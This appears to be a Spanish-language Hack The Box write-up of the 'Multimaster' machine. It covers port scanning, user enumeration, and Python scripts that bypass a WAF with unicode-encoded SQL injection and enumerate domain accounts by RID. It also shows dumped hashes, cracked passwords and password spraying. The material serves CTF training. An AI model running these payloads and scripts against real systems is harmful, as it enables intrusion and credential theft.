---
layout      : post
title       : "Maquina Multimaster - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Multimaster/multimaster_logo.png
category    : [ hackthebox ]
tags        : [ SqlInjection, WAF Bypass, Advanced Python Scripting, Active Directory, Smb Bruteforce, RPC Enum, Nishang, CEF Debugger, Server Operators ]
---

Hola de nuevo el de hoy vamos a estar resolviendo la maquina `Multimaster` de `hackthebox` que es una maquina `Windows` de dificultad `Insane`, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por `smb`, despues usaremos `wfuzz` para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una `sql injection` avanzada para hacer bypass un `waf` incorporado en la maquina, obtendremos los `RID Y SID` de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de `Visual Studio Code` que por medio de la exposicion `debugger` lograremos obtener `RCE`, finalmente usaremos BoodHound donde setearemos `kerberos dont require preauthetication` a un usuario miembro del grupo `Server Operators` y manipulando el binPath nos convertiremos en el usuario Administrator.


Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Multimaster
❯ ls
 Multimaster
```

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   nmap   scripts
```

## Enumeración [#](#enumeración) {#enumeración}
 

Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.179
PING 10.10.10.179 (10.10.10.179) 56(84) bytes of data.
64 bytes from 10.10.10.179: icmp_seq=1 ttl=127 time=117 ms

--- 10.10.10.179 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 116.535/116.535/116.535/0.000 ms
```
Vemos que recibimos respuesta y que el ttl es igual a 127 correspondiente a una maquina windowns, seguidamente procederemos a el scaneo de puertos con la ayuda de `nmap`:


### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.179 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:32 GMT
Initiating SYN Stealth Scan at 15:32
Scanning 10.10.10.179 [65535 ports]
Discovered open port 135/tcp on 10.10.10.179
Discovered open port 53/tcp on 10.10.10.179
Discovered open port 445/tcp on 10.10.10.179
Discovered open port 3389/tcp on 10.10.10.179
Discovered open port 80/tcp on 10.10.10.179
Discovered open port 139/tcp on 10.10.10.179
Discovered open port 3269/tcp on 10.10.10.179
Discovered open port 389/tcp on 10.10.10.179
Discovered open port 9389/tcp on 10.10.10.179
Discovered open port 49698/tcp on 10.10.10.179
Discovered open port 49667/tcp on 10.10.10.179
Discovered open port 3268/tcp on 10.10.10.179
Discovered open port 49675/tcp on 10.10.10.179
Discovered open port 49674/tcp on 10.10.10.179
Discovered open port 49681/tcp on 10.10.10.179
Discovered open port 88/tcp on 10.10.10.179
Discovered open port 5985/tcp on 10.10.10.179
Discovered open port 593/tcp on 10.10.10.179
Discovered open port 49666/tcp on 10.10.10.179
Discovered open port 636/tcp on 10.10.10.179
Discovered open port 464/tcp on 10.10.10.179
Completed SYN Stealth Scan at 15:32, 41.87s elapsed (65535 total ports)
Nmap scan report for 10.10.10.179
Host is up, received user-set (0.24s latency).
Scanned at 2023-03-31 15:32:09 GMT for 41s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 41.95 seconds
           Raw packets sent: 196589 (8.650MB) | Rcvd: 47 (2.068KB)
```
Podemos ver puertos interesantes que se encuentran abiertos como `135 rpc` , `139 ldap` , `445 smb` , `80 http`, 88 `Kerberos` y `5985 winrm`, podemos asumir que nos enfrentaremos a un entorno de directorio activo.

### Escaneo de Version y Servicios.


```java
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49698 10.10.10.179 -oN targets
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:35 GMT
Nmap scan report for 10.10.10.179
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-31 15:42:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-03-30T15:34:28
|_Not valid after:  2023-09-29T15:34:28
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-03-31T15:43:32+00:00
|_ssl-date: 2023-03-31T15:44:11+00:00; +6m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-03-31T08:43:32-07:00
| smb2-time: 
|   date: 2023-03-31T15:43:36
|_  start_date: 2023-03-31T15:34:34
|_clock-skew: mean: 1h30m58s, deviation: 3h07m50s, median: 6m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.97 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
|  53       |    DNS     | Simple DNS Plus  |      
|   80      |  HTTP       | Microsoft IIS httpd 10.0  |       
|     88      |    KERBEROS     |   Microsoft Windows Kerberos |
| 135     | RPC      | Microsoft Windows RPC |
| 139   | LDAP     | Microsoft Windows netbios-ssn |
| 445   | SMB      | ? |
| 3389 | RDP | Microsoft Terminal Services |
| 5985   | WINRM | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |



Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usando la herramienta `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.10.179
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
```
Añadimos el domain a nuestro `/etc/hosts`

```bash
echo "10.10.10.179 MEGACORP.LOCAL" >> /etc/hosts
```

## Explotación [#](#explotación) {#explotación}


Buscaremos si podemos listar recursos compartidos, para ello podemos hacer uso de smbmap con los parametros `-H` para especificar el host y `-u` para hacer uso de una sesion nula.

```bash
❯ smbmap -H 10.10.10.179 -u 'null'
[!] Authentication error on 10.10.10.179
```
Vemos que no contamos con acceso por smb , seguidamente probaremos a tratat de enumerar usuarios del sistema por rpc con `rpcclient` y de igual manera no tenemos acceso.

```bash
❯ rpcclient -U "" 10.10.10.179 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

Entonces procederemos a abrir la pagina web correspondiente a un `IIS`.

![](/assets/images/HTB/htb-writeup-Multimaster/multi1.PNG)


Despues de enumerar un rato la pagina web, en la opcion `colleague finder` realizamos una busqueda que nos reporta una lista de usuarios.


![](/assets/images/HTB/htb-writeup-Multimaster/multi2.PNG)

```bash
❯ cat users.txt
sbauer
okent
ckane
kpage
shayna
james
rmartin
jorden
alyx
ilee
nbourne
zpowers
aldom
minato
```

Vamos a validar si los usuarios son validos usando la herramienta `kerbrute`

* [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```bash
❯ /opt/kerbrute/kerbrute userenum --dc 10.10.10.179 -d MEGACORP.LOCAL users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop

2023/03/31 18:45:44 >  Using KDC(s):
2023/03/31 18:45:44 >  	10.10.10.179:88

2023/03/31 18:45:44 >  [+] VALID USERNAME:	ckane@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	okent@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	sbauer@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	rmartin@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	kpage@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	james@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	jorden@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	ilee@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	alyx@MEGACORP.LOCAL
2023/03/31 18:45:44 >  [+] VALID USERNAME:	zpowers@MEGACORP.LOCAL
2023/03/31 18:45:45 >  [+] VALID USERNAME:	nbourne@MEGACORP.LOCAL
2023/03/31 18:45:45 >  [+] VALID USERNAME:	aldom@MEGACORP.LOCAL
2023/03/31 18:45:45 >  Done! Tested 14 usernames (12 valid) in 0.787 seconds
```

Como nos encontramos en un entorno de directorio activo y es un domain controler, vamos a intentar realizar con los usuarios un `ASREPRoast Attack`, mediante el cual podemos solicituar un `TGT` sin conocer las contraseñas de los usuarios para obtener hashes que podemos crackear de forma offline. Para ello usaremos la herramienta de `impakcet` `GetNpUsers.py`.

* [https://github.com/fortra/impacket](https://github.com/ropnop/kerbrute)

```bash
❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Anteriormente veiamos que en `Colleague Finder` teniamos un input que vamos a proceder a interceptar con `burpsite` para tratar de causar un error en la consulta.


![](/assets/images/HTB/htb-writeup-Multimaster/multi4.PNG)


![](/assets/images/HTB/htb-writeup-Multimaster/multi5.PNG)


Cuando añadimos simbolos como la `'`, nos manda un mensaje de error `403` Forbidden y con otros simbolos un `200` ok, asi que vamos a intentar realizar fuerza bruta con `wfuzz` para entender que esta pasando, para ello usaremos un diccionario del repositorio de `danielmiessler` llamado `special-chars.txt`.

![](/assets/images/HTB/htb-writeup-Multimaster/multi6.PNG)

```bash
❯ wfuzz -c -X POST -t 100 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{"name":"FUZZ"}' -u http://10.10.10.179/api/getColleagues
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000007:   403        29 L     92 W       1233 Ch     "^"                                                                                                                    
000000015:   403        29 L     92 W       1233 Ch     "="                                                                                                                    
000000003:   403        29 L     92 W       1233 Ch     "@"                                                                                                                    
000000001:   403        29 L     92 W       1233 Ch     "~"                                                                                                                    
000000016:   403        29 L     92 W       1233 Ch     "{"                                                                                                                    
000000014:   403        29 L     92 W       1233 Ch     "+"
```

Vemos que al usar muchos hilos en la peticion el servidor nos bloquea por la existencia de un `WAF`, para ello con usos adicionaremos unos parametros `-s 1`, para que mande una peticion por segundo y ocultaremos el codigo de estado `200`

```bash
❯ wfuzz -c -X POST --hc=200 -s 1 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{"name":"FUZZ"}' -u http://10.10.10.179/api/getColleagues
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000004:   403        29 L     92 W       1233 Ch     "#"                                                                                                                    
000000021:   500        0 L      4 W        36 Ch       "\"                                                                                                                    
000000028:   403        29 L     92 W       1233 Ch     ":"                                                                                                                    
000000029:   403        29 L     92 W       1233 Ch     "'"                                                                                                                    
000000030:   403        29 L     92 W       1233 Ch     """                                                                                                                    
000000031:   403        29 L     92 W       1233 Ch     "<"                                                                                                                    
000000032:   403        29 L     92 W       1233 Ch     ">"                                                                                                                    

Total time: 32.39251
Processed Requests: 32
Filtered Requests: 25
Requests/sec.: 0.987882
```

Al finalizar wfuzz nos muestra que la `\` nos reporta un codigo de estado `500 Internal Server Error`, que curiosamente usa `sqlmap` con el nombre de `tamper` para ofuzcar sus payloads como en el siguente ejemplo.

```bash
 >>> tamper('SELECT FIELD FROM TABLE')
    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
```

A efectos practicos al mandar la peticion debemos usar ```\\u00``` seguido de cada caracter en hexadecimal no es necesario usar tres  `\` con uno basta.


Para no realizar la peticion una a una o usar sqlmap, vamos a realizarlo manualmente creandonos un script en `python3`:

```python
#!/usr/bin/python3

from pwn import *
import requests, time, json, signal

def def_handler(sig, frame):
    print("\n[!] Saliendo...!\n")
    sys.exit(1)

#ctrl_c -> al presionar nos ejecuta la funcion def_handler
signal.signal(signal.SIGINT, def_handler)

#global_variables
main_url = "http://10.10.10.179/api/getColleagues"


#recibimos la data como input y la tratamos 
def recivesql(sqlinyection):
    sqlmodified = ""
    for character in sqlinyection:
        sqlmodified += "\\u00" + hex(ord(character))[2:]

    return sqlmodified

#realizamos la peticion enviando la data tratada y la representamos en formato json

def sendsql(sqlmodified):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    data_post = '{"name": "%s"}' % sqlmodified
    
    
    r = requests.post(main_url, headers=headers, data=data_post)

    data_json = json.loads(r.text)

    return (json.dumps(data_json,indent=4))

if __name__ == '__main__':

#mediante un bucle recibimos la data como input

    while True:
        sqlinyection = input("> ")
        sqlinyection = sqlinyection.strip()
        sqlmodified = recivesql(sqlinyection)
        response_json = sendsql(sqlmodified)

        print(response_json)
```

Ejecutamos el script y realizamos una inyeccion `sql`.

```bash
❯ python3 sql_inject.py
> ttest' union select 1,schema_name,3,4,5 from information_schema.schemata-- -
[
    {
        "id": 1,
        "name": "db_accessadmin",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_backupoperator",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_datareader",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_datawriter",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_ddladmin",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_denydatareader",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_denydatawriter",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_owner",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "db_securityadmin",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "dbo",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "guest",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "INFORMATION_SCHEMA",
        "position": "3",
        "email": "4",
        "src": "5"
    },
    {
        "id": 1,
        "name": "sys",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
>
```
Enumerando la base de datos `dbo` encontramos usuarios y contraseñas encriptadas.

```bash
aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
ckane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
ilee:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
james:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
jorden:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
kpage:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
minatotw:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
nbourne:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
okent:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
rmartin:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
sbauer:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
shayna:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
zac:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
zpowers:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
```

Usaremos `hashcat` para crackear los hashes, y logramos obtener 3 contraseñas.

```bash
password1
finance1
banking1
```


Ya que tenemos una lista de usuarios y contraeñas probamos a validar si alguna de ellas es valida con `crackmapexec` y nos reprota que ninguna es valida.

```bash
❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE
```

Sim embargo debemos recordar que cuando nos encotramos en un entorno de directorio activo, podemos enumerar usuarios o informacion del `DC` a partir de inyecciones.


```bash
> test' union select 1,default_domain(),3,4,5-- -
[
    {
        "id": 1,
        "name": "MEGACORP",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
>  
```

Ahora con una query especifica vamos a lista el SID y RID correspondiente al usuario `Administrator`


> SID Y RID: El Identificador Relativo (RID) es parte del Identificador de Seguridad (SID) en los dominios de Microsoft Windows. Es la parte del SID que identifica a un principal de seguridad (un usuario, grupo o equipo) en relación con la autoridad que expidió el SID.


```bash
> testt' union select 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),3,4,5-- -
[
    {
        "id": 1,
        "name": "0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
>
```

De el resultado que nos reporta los ultimos 8 caracteres corresponden  al RDI, que viene a estar representado en hexadecimal si lo tratamos un poco.

```python
❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x01f4
500
>>> hex(500)
'0x1f4'
>>> hex(501)
'0x1f5
```

Si modificamos el rdi con el valor hexadecimal de `501`, entonces correspondera a otro usuario, en este caso `Ghest`.

```bash
> test' union select 1,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000)),3,4,5-- -
[
    {
        "id": 1,
        "name": "MEGACORP\\Guest",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
```

Esto nos da la idea que podemos lista los usuarios del `DC` a partir de poder conmutar el `RID`, para ello en vez de hacerlo uno por uno, vamos a modificar un poco el script que ya teniamos para gestionarlo mejor.


```python
#!/usr/bin/python3

from pwn import *
import requests, time, json, signal

def def_handler(sig, frame):
    print("\n[!] Saliendo...!\n")
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)

#global_variables
main_url = "http://10.10.10.179/api/getColleagues"
sid = "0x0105000000000005150000001c00d1bcd181f1492bdfc236"

#tratamos la data
def recivesql(sqlinyection):
    sqlmodified = ""
    for character in sqlinyection:
        sqlmodified += "\\u00" + hex(ord(character))[2:]

    return sqlmodified

#enviamos la data procesada
def sendsql(sqlmodified):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    data_post = '{"name": "%s"}' % sqlmodified
    
    
    r = requests.post(main_url, headers=headers, data=data_post)

    data_json = json.loads(r.text)

    return (json.dumps(data_json,indent=4))

#obtebemos el RID en el formato adecuado
def getRID(i):
    cadena = hex(i).replace("x","")
    lista = []
    for caracter in cadena:
        lista.append(caracter)
    rid = lista[2] + lista[3] + lista[0] +lista[1] + "0000"

    return rid

if __name__ == '__main__':

#establecemos un rango que casi siempre corresponden a los usuarios
    for i in range(1100, 1200):
        rid = getRID(i)
        sqli = "ttest' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -" % (sid, rid)
        sqlmodified = recivesql(sqli)
        response_json = sendsql(sqlmodified)

        print(response_json)
    
        time.sleep(2)
```

Una vez ejecutamos el script despues de un breve momento obtenemos nuevos usuarios.

```json
❯ python3 sql_inject.py
[
    {
        "id": 1,
        "name": "",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    {
        "id": 1,
        "name": "MEGACORP\\DnsAdmins",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    {
        "id": 1,
        "name": "MEGACORP\\DnsUpdateProxy",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    {
        "id": 1,
        "name": "MEGACORP\\svc-nas",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    {
        "id": 1,
        "name": "MEGACORP\\Privileged IT Accounts",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    
    {
        "id": 1,
        "name": "MEGACORP\\tushikikatomo",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    {
        "id": 1,
        "name": "MEGACORP\\andrew",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
[
    {
        "id": 1,
        "name": "MEGACORP\\lana",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
```

Con estos nuevos usuarios validamos con `crackmapexec` y esta vez obtenemos unas credenciales validas correspondiente al usuario `tushikikatomo`

```bash
❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
